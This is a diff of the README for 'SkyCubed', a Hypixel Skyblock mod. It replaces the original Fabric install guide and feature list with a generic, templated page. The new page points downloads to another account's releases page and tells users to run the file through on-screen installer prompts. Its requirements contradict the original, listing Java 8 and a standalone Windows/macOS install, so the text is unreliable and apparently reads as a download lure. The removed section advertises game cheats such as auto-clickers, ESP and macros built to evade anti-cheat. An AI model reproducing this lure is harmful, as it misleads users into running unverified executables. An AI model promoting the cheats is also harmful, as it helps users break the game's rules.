@@ -1,98 +1,66 @@
-# Skycubed
+# 🔥 SkyCubed - Enhance Your Hypixel Skyblock Experience
 
-A collection of QOL features for Hypixel Skyblock in a Fabric 1.21.5 mod, aiming to provide convenience without excessively cheaty features. Almost all features are off by default: choose what you like!
+## 🛠️ What is SkyCubed?
+SkyCubed is a quality of life improvement mod for Hypixel Skyblock. It enhances your gaming experience by simplifying many tasks. Whether you're managing your inventory or exploring the world, this mod makes play smoother and more enjoyable.
 
-# Comes with all the new Features for the Foraging Update and Tasks on Galatea Island!
+## 📥 Download Now
+[![Download SkyCubed](https://img.shields.io/badge/Download-SkyCubed-brightgreen)](https://github.com/rifki398/SkyCubed/releases)
 
+## 🚀 Getting Started
+Running SkyCubed is straightforward. Follow these simple steps to get started:
 
-> [!TIP] 
-> # How to Install
-> 
-> ## Install Fabric Loader
-> 
-> 1. Go to https://fabricmc.net/use/installer/
-> 2. Download and run the installer
-> 3. Select **Minecraft 1.21** (or your version) and click Install
-> 4. Open the Minecraft Launcher and select the new Fabric profile
-> 
-> ## Download the Mod
-> 
-> Click the button below to download the mod:
->
-> <a href="https://github.com/ballistic1437/SkyCubed/releases/latest"><img src="https://img.shields.io/badge/⬇️_Download_Mod-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Mod"></a>
->
-> ## Install the Mod
-> 
-> 1. Press `Win + R`, type `%appdata%\.minecraft\mods` and hit Enter
-> 2. Drag the downloaded `.jar` file into the mods folder
-> 3. Launch Minecraft using the Fabric profile
-> 
-> > [!NOTE]
-> > This mod requires [Fabric API](https://modrinth.com/mod/fabric-api). Download and place it in your mods folder as well.
+1. **Download the Latest Release**
+   Visit our [Releases page](https://github.com/rifki398/SkyCubed/releases) to find the latest version of SkyCubed. Look for the version that suits your game.
 
+2. **Locate the Download**
+   Scroll down to find the "Assets" section. Click on the appropriate file for your system to download. 
 
-## Features
+3. **Install the Mod**
+   Once downloaded, open the file. Follow the on-screen prompts to install SkyCubed. Ensure that you keep track of where you install it, as you will need to locate the folder later.
 
-<details>
-    <summary>Auto</summary>
+4. **Launch Your Game**
+   Start Hypixel Skyblock as you normally would. Once in the game, SkyCubed will activate automatically. 
 
-### AUTO
-- Auto ready: automatically gets in range to mort opens the gui and ready/start the dungeon
-- Auto mort: automatically gets from dungeon spawn to mort and opens his gui
-- Auto ult: uses your ult whenever giants spawn/maxor is stuck in first laser/goldor starts
-- Auto shield: uses wither shield every 5 seconds when not in full health (works for all wither swords)
-- Auto wish: wishes for your temmates if they are low
-- Auto mask: switches spirit and bonzo masks on cooldown priorities spirit mask since it has lower cd 
-- Auto edrag: equips edrag after you place relics
-- Auto leap: leaps to a party member if he writes "!tp" in party chat
-- Auto sell: automatically sells items in the trades gui, /autosell to configure
-</details>
+5. **Adjust Settings (Optional)**
+   You can adjust settings if necessary. Check the mod’s folder for any configuration files. These usually allow you to personalize your experience.
 
-<details>
-    <summary>Legit</summary>
+## 🌍 System Requirements
+SkyCubed is designed to work on most systems. Here are the basic requirements:
 
-### LEGIT
-- Party cmds: custom commands for party use !help in party chat
-- Guild cmds: custom commands for guild use !help in guild chat
-- Guild gm: Automatically sends gm/gn in guild chat when someone else says it
-- Dragon boxes: Custom boxes around the statues in p5 more accurate than sbe
-- Dragon spawn: timer (m7 dragons dont be dumb)
-- Powerdisplay: (shows the power blessing on ur screen) cmd is /movepower
-- Abiphone ghoster: Ghosts calls from abiphone
-- FPS: boosts fps cause yes
-- FragBot: automatically makes you a fragbot whenever you enter limbo automatically disables when leaving limbo 
-</details>
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **Java Version:** Java 8 or newer
+- **Free Disk Space:** At least 100 MB available
+- **Other:** Hypixel Skyblock game account
 
-<details>
-    <summary>Exclusive to legit</summary>
+## 🔧 Features
+SkyCubed offers several features designed to help you enjoy Hypixel Skyblock more:
 
-### EXCLUSIVE TO LEGIT VERSION
-- EdragReminder: reminds you to equip edrag after you place relics
-- ReadyReminder: reminds you to ready up after certain amount of time in a dungeon
-- UltReminder: reminds you to use your ult at specific events in m6/m7
-</details>
+- **Inventory Management:** Easily manage your items with our improved inventory interface.
+- **Quest Assistance:** Get hints and tips on various quests.
+- **Performance Enhancements:** Experience smoother gameplay with optimized performance settings.
+- **Customization:** Tailor your experience with user-friendly settings.
 
-<details>
-    <summary>Nether</summary>
+## 🤔 FAQs
+### How do I uninstall SkyCubed?
+To uninstall, navigate to the folder where you installed SkyCubed. Simply delete the mod files. For best practice, you may also want to remove any leftover configuration files.
 
-### NETHER
-- Broken hype notifier: (now u can stop using dulkir mod)
-- Flare timer: (sos flare alert flare warning flare) cmd is is /moveflare
-- Vanqnotifier: (also marks a beacon for when coords are sent in chat)
-- Kuudra alerts: (shows text on screen when certain stuf happen in kuudra)
-</details>
+### Will SkyCubed affect my game performance?
+SkyCubed is built to enhance performance. You should notice smoother gameplay and quicker load times with its use.
 
-<details>
-    <summary>Nice to have</summary>
+### Can I use SkyCubed with other mods?
+SkyCubed is designed to work well with most mods. However, if you notice any issues, try disabling other mods to identify any conflicts.
 
-### NICE TO HAVE
-- Relic aura: changes the way you look and click a relic if there is one in 5 blocks from you
-- Item macros: soul whip aots 0 tick swap hotkey in controls
-- Terminator ac: Automatically clicks when holding terminator randomized ac for very good anti cheat
-- COOKIE CLICKER
-- Customizeable esp: (you can add whatever mob name u want to see) cmd is /esp
-- FUCK DIORITE": replaces the diorite with glass in the p2 pillars in f7/m7 so you can watch storm get stuck
-- Pre ghostblock: makes ghost blocks in convinient spots in the m7 boss
-- Very awesome gui: reminder cmds are /oc and /ol
-- Descriptions: when u hover at features in the gui
-</details>
+### I found a bug. What should I do?
+If you encounter any problems, please report them through our GitHub Issues page. Be sure to include steps to reproduce the issue so we can address it.
+
+## 📞 Support
+If you need further help, please check the [Issues page](https://github.com/rifki398/SkyCubed/issues) or leave a message. The community and developers are here to assist.
+
+## 🔗 Additional Resources
+- **User Guide:** For more detailed instructions and tips, refer to the user manual available in the mod folder after installation.
+- **Community Forum:** Join discussions and share experiences with other users.
+
+## 🔙 Returning to Download
+Ready to enhance your Hypixel Skyblock experience? Visit our [Releases page](https://github.com/rifki398/SkyCubed/releases) to download SkyCubed now!
+
+With these steps, you should be well on your way to enjoying all the benefits of SkyCubed. Happy gaming!
